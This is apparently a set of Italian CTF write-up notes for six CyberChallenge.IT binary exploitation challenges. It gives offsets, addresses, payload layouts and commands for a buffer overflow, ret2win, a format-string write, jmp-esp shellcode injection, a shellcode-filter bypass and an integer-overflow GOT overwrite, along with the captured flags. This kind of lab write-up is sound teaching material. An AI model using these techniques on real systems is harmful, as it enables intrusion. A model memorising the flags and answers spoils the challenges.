## **SS_2.01** 

1. se si ci collegava con nc billboard.challs.cyberchallenge.it 9120 si vede che se una modalità "devmode" che però risulta sempre spenta 

2. Dal file billborad.c si vede che i dati vengono gestiti con una strcu 
```c
struct billboard {
    char text[256];
    char devmode;
};
```
Quindi in memoria ci sono 256 byte per il testo e 1 byte per la modalità (adesso impostata a falsa) 

Nella funziona set\_text ce una falla: 

```c
void set_text(int argc, char* argv[]) {
    strcpy(bb.text, argv[1]); 
    // ...
}
```

La funzione strcmpy non ontrolla la lunghezza dell'input e qundi si può andare a so0vrascrivere sopra la variabile 
```c
if (bb.devmode) { // Entra solo se devmode NON è 0
    system("/bin/bash");
}
```
Quindi serve uno script che manda un payload di 257 byte in modo tale da attivare la modalità dev 

3. nella modalità dev faccio dopo ls e cat flag.txt

4. CCIT{Digital Billboard from 34c3 Junior CTF - 4NJrKJXftqrrHDuQ}



## ""SS_2.02** 

Per prima cosa, dobbiamo capire con cosa abbiamo a che fare. Il comando `file` ci dice l'architettura, mentre `checksec` (uno strumento del pacchetto `pwntools`) ci dice quali protezioni sono attive.

```bash 
# Controlla il tipo di file
file 1996

# Controlla le protezioni (Fondamentale!)
# Se non hai checksec, lo trovi con: pip install pwntools
checksec 1996
```

**Cosa abbiamo scoperto:** Il file è a 64-bit, **No Canary** (possiamo sovrascrivere lo stack) e **No PIE** (gli indirizzi sono statici).

Dobbiamo trovare l'indirizzo della funzione "premio" (`spawn_shell`). Abbiamo usato `objdump`

```bash
# Cerca l'indirizzo della funzione spawn_shell
objdump -d 1996 | grep spawn_shell
```

**Risultato:** Abbiamo trovato l'indirizzo `0x400897`.

Per sapere quanti byte servono per arrivare al Return Address, guardiamo l'assembly del `main`.

```bash
# Guarda l'assembly della funzione main
objdump -d 1996 -M intel | grep -A 20 "<main>:"
```

Nell'output abbiamo visto: `lea rax, [rbp-0x410]`.

- `0x410` in decimale è **1040**.
    
- Lo stack frame a 64-bit prevede: `[Buffer (1040)] + [Saved RBP (8)] + [Return Address (8)]`.
    
- **Offset totale:** $1040 + 8 = 1048$ byte.
    

A 64-bit, se il programma crasha mentre esegue la shell, è colpa dell'allineamento a 16-byte dello stack. Serve un indirizzo di un'istruzione `ret` (un "salto sul posto").

```bash
# Troviamo un'istruzione RET qualsiasi nel codice
objdump -d 1996 | grep ret
```

Abbiamo scelto `0x4008cc`.

2. fatto con script in python e dopo si fa sempre ls --> cat flag.txt
3. CCIT{1996 from 35c3 Junior CTF - k6myGBZxs7N3Cvs3}


## **SS_2.03** 

Guardando il file `the_answer.c`, abbiamo scovato un errore:

```c
printf(name);
```

Il programmatore ha passato il nostro input direttamente a `printf`. Questo trasforma il nostro input in un **comando** per la funzione. Usando i simboli `%`, possiamo leggere lo stack o scrivere in memoria.

L'obiettivo era far sì che la variabile `answer` valesse **42**.

1. Abbiamo usato `objdump` per trovare dove si trovasse quella variabile nella memoria del programma:

Bash

```
objdump -t the_answer | grep answer
# Oppure
objdump -d the_answer | grep answer
```

**Risultato:** L'indirizzo di `answer` è `0x601078`.

2. Dobbiamo sapere in quale "cassetto" dello stack finisce il nostro input per poterlo usare come puntatore. Abbiamo usato questo comando:
```bash 
python3 -c "print('AAAABBBB' + ' %p'*15)" | nc answer.challs.cyberchallenge.it 9122
```

Nell'output abbiamo cercato `0x4242424241414141` (che sono le nostre A e B in esadecimale) e abbiamo contato la sua posizione.

**Risultato:** Il nostro buffer iniziava all'**offset 10**.

3. Abbiamo usato due "magie" di `printf`:

- `%42c`: Dice a `printf` di stampare 42 caratteri (spazi). Questo imposta il contatore interno di caratteri stampati a **42**.
    
- `%$n`: Dice a `printf` di prendere il contatore (42) e **scriverlo** nell'indirizzo che trova a un certo offset dello stack.
    
4. A 64-bit l'allineamento è fondamentale. Ogni slot dello stack è di 8 byte.

- **Slot 10:** Abbiamo messo `%42c%12$n`. È lungo 9 byte, quindi abbiamo aggiunto padding per arrivare a 16 byte (occupando gli slot 10 e 11).
    
- **Slot 12:** Abbiamo messo l'indirizzo `0x601078`.


5. CCIT{50 LoNg, & Thanks for 4ll tH3 F1sh}


## **SS_2.04**

Per prima cosa abbiamo analizzato il binario e il comportamento della shell remota.

- **Identificazione del tipo di file:** Abbiamo scoperto che era un file Linux a 32 bit (`ELF 32-bit`).
- **Comportamento sospetto:** Provando comandi lunghi, il programma crashava con un `Segmentation fault`. Questo ci ha confermato che usava una funzione insicura come `gets()`.
- **Analisi dei simboli (`nm`):** Abbiamo cercato funzioni "nascoste".

    ```bash
    nm restricted_shell | grep shell
    # Risultato: 08048516 T shell
    ```
    Abbiamo trovato una funzione chiamata `shell`, ma analizzandola con `objdump` abbiamo capito che non era una shell vera, ma solo un "loop" che riavviava la shell ristretta.


Abbiamo usato `checksec` (o guardato l'output di `pwntools`) per vedere come potevamo attaccare:
- **NX (No-Execute):** Disabilitato. Questo è stato fondamentale! Significa che lo **stack è eseguibile**. Potevamo scrivere del codice lì e farlo girare.
- **ASLR:** Probabilmente disabilitato o bypassabile, dato che avevamo un indirizzo fisso per saltare.


Dato che non c'erano funzioni "win" pronte all'uso, abbiamo deciso di iniettare uno **Shellcode** (un piccolo programma in linguaggio macchina che apre `/bin/sh`).


```bash
objdump -d restricted_shell | grep -A 20 "<shell>:"
```

Nell'output abbiamo visto questa riga:
`804852f: 8d 45 d8  lea -0x28(%ebp),%eax`

**Cosa significa?**
- `0x28` in esadecimale è **40** in decimale.
- Il programma sta preparando uno spazio di **40 byte** per il tuo input.
- Subito dopo questi 40 byte, lo stack mette il **Saved EBP** (altri 4 byte).
- **Totale: 40 + 4 = 44.**
- Il 45° byte è l'inizio dell'**EIP** (l'indirizzo di ritorno). 


Quando non eravamo sicuri, abbiamo usato un piccolo ciclo Bash per testare diversi valori. È il metodo più pratico quando non hai il codice sorgente.

```bash
for i in {40..60..4}; do 
    echo "Test offset $i"
    python3 -c "print('A'*$i + 'BBBB')" | ./restricted_shell
done
```
Se con l'offset **44** vedevamo che il programma cercava di saltare a `BBBB` (esadecimale `0x42424242`), avevamo la conferma matematica che 44 era il "numero magico".

Per far funzionare lo shellcode, non potevamo saltare a un indirizzo a caso. Ci serviva un "trampolino". Abbiamo usato `pwntools` per cercarlo dentro il binario stesso:

```python
binary = ELF('./restricted_shell')
jmp_esp = next(binary.search(asm('jmp esp')))
```

Questo comando ha scansionato tutto il codice del programma (che è caricato in memoria a indirizzi fissi) cercando i byte `\xff\xe4` (che in linguaggio macchina significano `jmp esp`). Lo ha trovato a `0x08048593`.

### Quindi:

Il nostro payload finale era composto da tre parti:
1.  **Padding (44 byte):** Una serie di "A" per riempire il buffer fino ad arrivare all'indirizzo di ritorno.
2.  **L'Indirizzo di Salto (`0x08048593`):** Abbiamo cercato nel binario l'istruzione `jmp esp`. Questa istruzione dice alla CPU: "vai a eseguire quello che trovi subito dopo nello stack".
3.  **NOP Sled (`\x90` * 32):** Una "scivolata" di istruzioni vuote per dare stabilità.
4.  **Shellcode:** Il codice maligno per la shell.

poi abbimao fatto ls, cat flag.txt e script in python 


CCIT{You f0unD Ur fir5T G4dge7. ROP is w41t1n9}


## **SS_2.05**

Challenge lmrtfy ("Let Me Run That For You"): il server ti fa inviare shellcode x86 a 32 bit e lo esegue. Lo scopo è leggere flag.txt. Facedno il disassemblaggio del main il flusso è: 

1. mmap(...) --> alloca una pagina di memoria e stampa "...what would you like to run?".
2. fgets(buf, 0x100, ...) --> legge il tuo shellcode (max 256 byte).
3. Filtro di sicurezza: tre memmem cercano sequenze vietate dentro il tuo input. La stringa chiave in .rodata è:
INT 80h is forbidden
   e il "needle" cercato è proprio cd 80 (i byte 0x804a05d = \xcd\x80). Cioè: non puoi mandare l'istruzione int 0x80 scritta esplicitamente nello shellcode.
4. Se il controllo passa --> stampa "Ok, your code seems safe; running it...", fa mprotect sulla pagina, poi call eax --> esegue il tuo shellcode.

Quindi è una classica "shellcode jail": esecuzione libera, ma con un filtro sui byte. Quindi visto che \xcd\x80 è vietato, non si può fare una syscall diretta ma si fa una **syscall indiretta** (costruita sullo stack) per:

1. Rendere la memoria eseguibile.
2. Aprire `flag.txt`.
3. Leggerlo in un buffer.
4. Stamparlo sullo standard output per recuperarlo.


5. CCIT{5anDboX1ng\_aint\_3a5Y}


## **SS_2.06** 


È un attacco di **Heap Exploitation** da manuale, combinando un **Integer Overflow** con un **GOT Overwrite**

Il programma ci permetteva di scegliere la lunghezza dell'array. Quando abbiamo chiesto un array di tipo `int64` (8 byte) con lunghezza 2305843009213693956, abbiamo causato un overflow nel calcolo della memoria:
* **Calcolo atteso:** lunghezza \times 8 (byte).
* **Risultato:** Il numero era così grande che ha superato il limite dei 64 bit, "facendo il giro" e tornando quasi a zero.
* **Effetto:** Il sistema ha allocato pochissimo spazio fisico (32 byte), ma il programma era convinto che l'array `A` fosse immenso.


Grazie a questo finto array gigante, abbiamo usato `get A <indice>` per leggere oltre la memoria allocata per `A`. Nell'Heap (la zona di memoria dove finiscono gli array), le strutture sono vicine. 
Leggendo gli indici successivi, abbiamo trovato i metadati dell'array `B`:
- Indice 5: La dimensione del "chunk" di memoria.
- Indice 6: La lunghezza di `B`.
- Indice 7: Il tipo di `B`.
- **Indice 8: Il puntatore**, ovvero l'indirizzo di memoria dove l'array `B` salva i suoi dati.

Qui è avvenuta la magia. Usando `set A 8 <indirizzo_GOT>`, abbiamo sovrascritto il puntatore dell'array `B`. 
Invece di far puntare `B` alla sua memoria legittima, lo abbiamo costretto a puntare alla **Global Offset Table (GOT)**, la sezione del programma che contiene gli indirizzi delle funzioni di sistema (come `free`, `printf`, ecc.).


A questo punto, l'array `B` era diventato un "telecomando" per la memoria del sistema:
* Abbiamo usato `set B 0 <indirizzo_spawn_shell>` per scrivere sopra l'indirizzo della funzione `free` nella GOT.
* Da quel momento, per il computer, la funzione `free` **era diventata** la funzione `spawn_shell`.

Infine, abbiamo digitato `delete B`. Il programma ha provato a fare "pulizia" chiamando `free(B)`, ma poiché avevamo cambiato l'indirizzo nella tabella, la CPU è saltata direttamente all'istruzione per aprire la shell.

 Abbiamo usato un errore matematico (overflow) per ottenere una vista privilegiata della memoria, abbiamo manomesso i puntatori per puntare al "cervello" del programma (la GOT) e abbiamo scambiato una funzione legittima con una che ci ha dato il controllo totale. 




```bash 
nome_utente$ nc arraymaster1.challs.cyberchallenge.it 9125

We implemented int8, int16, int32, and int64 arrays in C.
However, we didn't have time to test them properly.
Here is a little test suite. Hopefully you won't find any exploitable bugs!
You can perform the following operations:
[1] list
    Print a summary of all arrays
[2] init <ID> <type> <l>
    Create an array with ID {A-J} of type {8, 16, 32, 64} and length l
[3] delete <ID>
    Delete the array with ID {A-J}
[4] set <ID> <i> <value>
    Set the value at index i of array ID {A-J}
[5] get <ID> <i>
    Get the value at index i of array ID {A-J}
[6] quit
    Leave the program because there are no bugs anyway


Enter the command you want to execute.
[1] list
[2] init <ID> <type> <l>
[3] delete <ID> 
[4] set <ID> <i> <value>
[5] get <ID> <i>
[6] quit

> init A 64 2305843009213693956

Enter the command you want to execute.
[1] list
[2] init <ID> <type> <l>
[3] delete <ID> 
[4] set <ID> <i> <value>
[5] get <ID> <i>
[6] quit

> init B 64 10

Enter the command you want to execute.
[1] list
[2] init <ID> <type> <l>
[3] delete <ID> 
[4] set <ID> <i> <value>
[5] get <ID> <i>
[6] quit

> set A 8 4210712

Enter the command you want to execute.
[1] list
[2] init <ID> <type> <l>
[3] delete <ID> 
[4] set <ID> <i> <value>
[5] get <ID> <i>
[6] quit

> set B 0 4199298

Enter the command you want to execute.
[1] list
[2] init <ID> <type> <l>
[3] delete <ID> 
[4] set <ID> <i> <value>
[5] get <ID> <i>
[6] quit

> delete B
ls
chall
flag
cat flag
```

- CCIT{arraymaster1 from 35c3 Junior CTF - kx7Fm7nYS4wtPFJ4}



